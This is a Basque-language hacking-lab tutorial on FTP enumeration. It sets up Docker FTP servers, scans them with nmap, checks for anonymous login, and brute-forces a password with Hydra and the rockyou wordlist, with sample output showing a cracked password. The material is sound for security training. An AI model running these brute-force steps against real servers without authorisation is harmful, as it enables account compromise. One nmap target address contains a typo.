
# FTP ennumerazioa

Mota honetan, fitxategiak transferitzeko protokoloari (FTP) buruz hitz egingo dugu, eta horri buruzko azterketa nola aplikatu informazioa biltzeko.

FTP protokolo asko erabiltzen da fitxategiak sareetara transferitzeko. FTP zerbitzuaren zerrendatzeak informazio garrantzitsua biltzea dakar, hala nola FTP zerbitzariaren bertsioa, fitxategien baimenen konfigurazioa, erabiltzaileak eta pasahitzak (indar gordineko erasoen edo guessing-en bidez), besteak beste.

Jarraian, gela honetan ukitzen dugun lehen proiekturako esteka duzue:

### Pasahitza duen ftp zerbitzaria ( hacking lab docker-composen jada gehituta)

Docker-FTP-Server: https://github.com/garethflowers/docker-ftp-server

Deskargatzen dugun lehen proiekturako erabiltzen dugun tresnetako bat "Hydra" da. Hydra kode irekiko sartze-probak egiteko tresna bat da, eta pasahitzak babestutako sistemen eta zerbitzuen aurka indar gordineko erasoak egiteko erabiltzen da. Tresna oso pertsonalizagarria da eta sareko protokolo-sorta zabala onartzen du, besteak beste, HTTP, FTP, SSH, Telnet eta SMTP.

FTPrako erabiltzaile gonbidatuak autentifikatzea ahalbidetzen duen edukiontzia hedatzeko erabiltzen ditugun proiektuen artean hurrengoa "metabrainz" en "docker-anon-ftp" proiektua da. Jarraian, proiekturako esteka duzue:

### Pasahitzik gabeko ftp zerbitzaria

Docker-ANON-FTP: https://github.com/metabrainz/docker-anon-ftp

```bash 
docker run -d -p 20-21:20-21 -p 65500-65515:65500-65515 -v /tmp:/var/ftp:ro --network=hacking-lab_pentesting-lab-network metabrainz/docker-anon-ftp 
```

## Pasahitza duen FTP zerbitzaria 

###  Rock you pasahitz dikzionarioa deskargatu 


https://github.com/zacheller/rockyou

```bash
cd
git clone https://github.com/zacheller/rockyou
cd rockyou
mkdir /usr/share/wordlists
tar xC /usr/share/wordlists -f rockyou.txt.tar.gz
```

### FTP zerbitzua aurkitu nmap-ekin

Erabili localhost edo sarea + maskara hurrengo aginduan

```bash
nmap -sCV -p20,21 127.18.0.0\16
```

Honelako erantzunen bat agertu beharko litzateke:
```bash
Nmap scan report for my-ftp-server.hacking-lab_pentesting-lab-network (172.18.0.6)
Host is up (0.000036s latency).

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 2.0.8 or later
MAC Address: 02:42:AC:12:00:06 (Unknown)
```


### Hydra

```bash
hydra -l user -P rockyou.txt ftp://172.18.0.6 -t 15
```

Mayuskula bada dikzionario bat erabiliko du.

- -l erabiltzailea dakigu
- -L erabiltzailea dikzionario batetik hartuko du
- -P pasahitz dikzionarioa
- -t 15 : 15 thread aldi berean

Honelako erantzun bat agertu beharko litzateke:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-30 12:49:37
[DATA] max 15 tasks per 1 server, overall 15 tasks, 200 login tries (l:1/p:200), ~14 tries per task
[DATA] attacking ftp://172.18.0.6:21/
[21][ftp] host: 172.18.0.6   login: user   password: louise
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-30 12:50:06
```

## Pasahitzik gabeko FTP zerbitzaria

Kasu honetan erabil froga dezakegu zuzenenan Anonymus erabiltzailerarekin edo nmapek eskuragarri duen `ftp-anon` scriptarekin

```bash
nmap --script ftp-anon -p21 172.18.0.2
```

Honelako erantzun bat itzuli beharko luke:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-30 13:02 UTC
Nmap scan report for f0304f75721e.hacking-lab_pentesting-lab-network (172.18.0.2)
Host is up (0.000037s latency).

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```